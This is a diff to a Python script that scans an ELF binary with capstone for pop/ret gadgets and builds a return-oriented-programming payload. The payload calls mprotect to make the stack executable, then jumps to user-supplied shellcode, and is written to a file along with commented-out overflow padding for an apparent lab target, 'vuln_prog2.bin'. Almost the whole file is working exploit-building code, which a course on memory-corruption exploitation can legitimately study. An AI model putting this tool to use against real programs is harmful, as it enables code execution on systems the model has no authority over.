@@ -9,7 +9,7 @@ from elftools.elf.relocation import RelocationSection
 #filename= 'a.out'
 filename = input("Input path of binary:")
 
-#values for modified voln_prog2:
+#values for modified vuln_prog2.bin. You will have to find these values yourself:
 '''
 base of binary: 0x555555554000
 address of mprotect: 0x7ffff7affc00
@@ -19,14 +19,15 @@ base of stack: 0x7fffffffe0b0
 
 disas = [] #list of tuples: tup[0] = address, tup[1] = instruction, tup[2] = args
 
+# Helper Function
+# Takes in string bytes and adds zeros until expectedLength
+# Fixes leading zero issue when converting from bytes to integers, then back to bytes
 def zerochecker(bytes, expectedLength):
     while len(bytes) != expectedLength:
         bytes = "0x0" + bytes[2:]
     return bytes
 
-
-
-
+# Open ElF bin
 with open(filename, 'rb') as file:
         elf = ELFFile(file)
         code = elf.get_section_by_name('.text')
@@ -47,6 +48,7 @@ with open(filename, 'rb') as file:
         # have addr etc for first one
         # for next call, increment addr by len of previous byte array
 
+        # this while loop gets pop and ret instruction segments from capstone disas
         while(opslist != []):
             while (opslist[0] != b""):
                 for (address, size, mnemonic, op_str) in md.disasm_lite(opslist[0], addr):
@@ -56,6 +58,7 @@ with open(filename, 'rb') as file:
                 opslist[0] = opslist[0][1:]
             opslist = opslist[1:]
 
+# this while loop filters instruction segments to get useful gadgets
 gadgets = []
 gadgetIndex = 0
 getOneRet = True
@@ -102,8 +105,8 @@ for i in gadgets:
         print(i)
 print("Number of unique gadgets: " + str(len(gadgets)))
 
-# now that duplicates are repmoved, remove gadgets with multiple of: rdi, rsi, rdx
-
+# finds the shortest length gadget for pop rdi, rsi, and rdx
+# our filtering limits gadget size to 6, but we prefer smaller gadgets (2 is ideal, just pop reg and ret)
 shortest_rdi = 100
 shortest_rsi = 100
 shortest_rdx = 100
@@ -126,9 +129,11 @@ print("Length of shortest gadget to pop rdi = " + str(shortest_rdi))
 print("Length of shortest gadget to pop rsi = " + str(shortest_rsi))
 print("Length of shortest gadget to pop rdx = " + str(shortest_rdx))
 
+# Exit if no gadgets found to pop rdi, rsi, and rdx
 if (shortest_rdi == 100) or (shortest_rsi == 100) or (shortest_rdx == 100):
     sys.exit("Unable to find necessary gadgets to build payload!")
 
+# Obtain necessary inputs from the user
 baseOfBinary = input("Input base of the binary in hex, including the leading \"0x\": ")
 addressOfMprotect = input("Input address of mprotect (PLT or libc is fine), including leading  \"0x\": ")
 addressOfPayload = input("Input address of start of payload, including leading  \"0x\": ")
@@ -137,16 +142,18 @@ fileForShellcode = input("Input path of file for shellcode input: ")
 shellcodeFile = open(fileForShellcode,'r')
 shellcodeTemp = shellcodeFile.read()
 
-
+# hack to get shellcode from file properly
 b = shellcodeTemp
 c = bytearray(b, encoding='latin1')
 shellcode = c.decode('unicode-escape').encode('ISO-8859-1')
 shellcode = shellcode[:-2]
 #shellcode = b"\x48\x31\xc0\x48\xff\xc0\x48\x31\xff\x48\xff\xc7\x48\x31\xf6\x48\x8d\x35\x29\x11\x11\x01\x48\x81\xee\x10\x11\x11\x01\x48\x31\xd2\x80\xc2\x0d\x0f\x05\x48\x31\xc0\x04\x3c\x48\x31\xff\x48\x83\xc7\x64\x0f\x05\x48\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x0a"
 
+#setup address of mprotect
 faddr_byte_array = bytearray.fromhex(addressOfMprotect[2:])
 faddr_byte_array.reverse()
 
+#setup base of stack
 baseOfStack_byte_array = bytearray.fromhex(baseOfStack[2:])
 baseOfStack_byte_array.reverse()
 
@@ -159,10 +166,12 @@ startOfMprotect = endOfStack - endOfStack%4096
 sizeOfMprotect = sizeOfStack + sizeOfPayload + endOfStack%4096
 sizeOfMprotect += 4096-(sizeOfMprotect%4096)
 
+
 rdi_addr.reverse()
 rsi_addr.reverse()
 rdx_addr.reverse()
 
+#get gadget addresses ready (add offset from capstone to base of binary)
 rdi_addr = bytearray.fromhex(hex(int.from_bytes(rdi_addr, 'little') + int(baseOfBinary, 16))[2:])
 rsi_addr = bytearray.fromhex(hex(int.from_bytes(rsi_addr, 'little') + int(baseOfBinary, 16))[2:])
 rdx_addr = bytearray.fromhex(hex(int.from_bytes(rdx_addr, 'little') + int(baseOfBinary, 16))[2:])
@@ -172,7 +181,7 @@ rsi_addr.reverse()
 rdx_addr.reverse()
 
 # start building ROP payload
-garbage = b"\x00\x00\x00\x00\x00\x00\x00\x00"
+garbage = b"\x00\x00\x00\x00\x00\x00\x00\x00" #used if we need to pop multiple registers for gadgets
 rdi_arg = bytearray.fromhex(zerochecker(hex(startOfMprotect), 18)[2:])
 rdi_arg.reverse()
 rsi_arg = bytearray.fromhex(zerochecker(hex(sizeOfMprotect), 18)[2:])
@@ -180,17 +189,18 @@ rsi_arg.reverse()
 rdx_arg = b"\x07\x00\x00\x00\x00\x00\x00\x00"
 mprotect_addr = faddr_byte_array
 
-# gadget addrs need to be calculated from base of binary
-
 payload = rdi_addr + b"\x00\x00" + rdi_arg + garbage * (shortest_rdi - 2)
-#print(payload)
 payload += rsi_addr + b"\x00\x00" + rsi_arg + garbage * (shortest_rsi - 2)
 payload += rdx_addr + b"\x00\x00" + rdx_arg + garbage * (shortest_rdx - 2)
 payload += mprotect_addr + b"\x00\x00"
 shellcode_addr = bytearray.fromhex(hex(int(addressOfPayload, 16) + len(payload) + 8)[2:])
 shellcode_addr.reverse()
 payload += shellcode_addr + b"\x00\x00" + shellcode
+
+#write payload to file
 f = open('payload.txt', 'wb')
-f.write(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+payload)
-#f.write(payload)
+f.write(payload)
+
+#below line contains padding needed to obtain control flow for vuln_prog2.bin
+#f.write(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+payload)
 f.close()
